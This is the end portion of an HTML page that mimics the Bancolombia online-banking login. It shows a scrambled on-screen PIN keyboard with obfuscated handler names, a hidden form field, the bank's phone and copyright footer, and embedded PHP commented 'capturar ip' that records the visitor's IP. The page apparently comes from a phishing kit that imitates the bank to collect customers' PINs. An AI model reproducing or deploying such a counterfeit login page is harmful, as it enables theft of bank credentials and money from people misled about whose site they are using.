								<div id="keyboard_">  <table class="keyboard" border="0" cellspacing="0" cellpadding="0" align="left" valign="top">  <tbody><tr>    <td width="0" height="18"></td>    <td></td>  </tr>  <tr>    <td height="0" width="1"></td>    <td colspan="2">      <table align="left" valign="top" cellspacing="0" cellpadding="0" class="bg_button">        <tbody><tr align="left">                  <td valign="top" align="left"> <table class="bg_button" id="_KEYBRD" valign="top">  <tbody><tr><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="M_mWmzhyCnYh();" onmouseout="changeToOrigKeyboard();" onclick="xPxktZRXoHMU(&quot;gIK&quot;); darNumero(&quot;7&quot;)">  <div border="0" id="IPnLXVrPZKxW7" valign="center" align="center" onfocus="this.blur();" onclick="darNumero('7')" class="colorContrast2">7</div></td><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="M_mWmzhyCnYh();" onmouseout="changeToOrigKeyboard();" onclick="xPxktZRXoHMU(&quot;n4L&quot;);">  <div border="0" id="IPnLXVrPZKxW1" valign="center" align="center" onfocus="this.blur();" onclick="darNumero(1)" class="colorContrast2">1</div></td><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="M_mWmzhyCnYh();" onmouseout="changeToOrigKeyboard();" onclick="xPxktZRXoHMU(&quot;AMX&quot;);">  <div border="0" id="IPnLXVrPZKxW9" valign="center" align="center" onfocus="this.blur();" onclick="darNumero('9')" class="colorContrast2">9</div></td></tr>  <tr><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="M_mWmzhyCnYh();" onmouseout="changeToOrigKeyboard();" onclick="xPxktZRXoHMU(&quot;WdQ&quot;);">  <div border="0" id="IPnLXVrPZKxW2" valign="center" align="center" onfocus="this.blur();" onclick="darNumero('2')" class="colorContrast2">2</div></td><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="M_mWmzhyCnYh();" onmouseout="changeToOrigKeyboard();" onclick="xPxktZRXoHMU(&quot;me8&quot;);">  <div border="0" id="IPnLXVrPZKxW6" valign="center" align="center" onfocus="this.blur();" onclick="darNumero('6')" class="colorContrast2">6</div></td><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="M_mWmzhyCnYh();" onmouseout="changeToOrigKeyboard();" onclick="xPxktZRXoHMU(&quot;0h3&quot;);">  <div border="0" id="IPnLXVrPZKxW0" valign="center" align="center" onfocus="this.blur();" onclick="darNumero('0')" class="colorContrast2">0</div></td></tr>  <tr><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="M_mWmzhyCnYh();" onmouseout="changeToOrigKeyboard();" onclick="xPxktZRXoHMU(&quot;kSa&quot;);">  <div border="0" id="IPnLXVrPZKxW8" valign="center" align="center" onfocus="this.blur();" onclick="darNumero('8')" class="colorContrast2">8</div></td><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="M_mWmzhyCnYh();" onmouseout="changeToOrigKeyboard();" onclick="xPxktZRXoHMU(&quot;2bc&quot;);">  <div border="0" id="IPnLXVrPZKxW3" valign="center" align="center" onfocus="this.blur();" onclick="darNumero(3)" class="colorContrast2">3</div></td><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="M_mWmzhyCnYh();" onmouseout="changeToOrigKeyboard();" onclick="xPxktZRXoHMU(&quot;H67&quot;);">  <div border="0" id="IPnLXVrPZKxW5" valign="center" align="center" onfocus="this.blur();" onclick="darNumero('5')" class="colorContrast2">5</div></td></tr>  <tr><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="M_mWmzhyCnYh();" onmouseout="changeToOrigKeyboard();" onclick="xPxktZRXoHMU(&quot;fNj&quot;);">  <div border="0" id="IPnLXVrPZKxW4" valign="center" align="center" onfocus="this.blur();" onclick="darNumero('4')" class="colorContrast2">4</div></td><td colspan="2" onclick="clearKeys();" class="bg_buttonSmall"><div id="clearKey" onclick="borrar_numero()" border="0" valign="center" align="center" onfocus="this.blur();" class="colorContrast2">Borrar</div></td></tr></tbody></table><table class="bg_button" id="_CONSTRAST" valign="top" cellspacing="0">  <tbody><tr><td><img width="90" height="34" border="0" src="./mua/images/kb/2.png" name="constrastImg" id="constrastImg" usemap="#numericKeyboardMap"> <map name="numericKeyboardMap" id="numericKeyboardMap"><area shape="circle" class="cursorContrast" coords="10,30,15" onmouseover="setHandCursor(document.constrastImg)" onclick="changeContrastLevel(1)" onmouseout="setDefaultCursor(document.constrastImg)"><area shape="circle" class="cursorContrast" coords="50,30,15" onmouseover="setHandCursor(document.constrastImg)" onclick="changeContrastLevel(2)" onmouseout="setDefaultCursor(document.constrastImg)"><area shape="circle" class="cursorContrast" coords="90,30,15" onmouseover="setHandCursor(document.constrastImg)" onclick="changeContrastLevel(3)" onmouseout="setDefaultCursor(document.constrastImg)"></map></td></tr></tbody></table></td>        </tr>      </tbody></table>    </td>  </tr><tr>    <td height="17"></td>    <td colspan="2"></td>  </tr> </tbody></table></div>
								<div id="inputs_"><input type="hidden" name="gpibhdFSdyjP" value=""></div>
               
						</div>

		                	
					</div>
				</div>
		</div>
		        
	</div>
<div class="row">
	<div class="col-xs-12 col-sm-12 col-md-12">
		<p class="mua-footer mua-footer-info-call">
			Sucursal Telefónica Bancolombia: Bogotá 343 0000 - Medellín 510 9000 - Cali 554 0505 - Barranquilla 361 8888 - Cartagena 693 4400 - Bucaramanga 697 2525 - Pereira 340 1213 - El resto del país 01 800 09 12345 <br> Sucursales Telefónicas en el exterior: España 900 995 717 - Estados Unidos 1866 379 9714.
		</p>
	</div>
</div>
	        <script type="text/javascript">
	var year = (new Date).getFullYear();
	$(document).ready(function() {
	  $("#fecha").text( year );
	});
	</script>
	        <div style="margin-top: 10px;">
	            <div class="mua-title-text pull-left">Dirección IP: 
                <!-- capturar ip -->
              <?php 
                function getRealIP() {

        if (!empty($_SERVER['HTTP_CLIENT_IP']))
            return $_SERVER['HTTP_CLIENT_IP'];
           
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
       
        return $_SERVER['REMOTE_ADDR'];
}
       echo " {$_SERVER['REMOTE_ADDR']}";
                ?></div>
	            <div class="mua-title-text pull-right">Copyright ©&nbsp;<span id="fecha">2018</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</div>
	        </div>
</div>
</script>	
</form>
</body></html>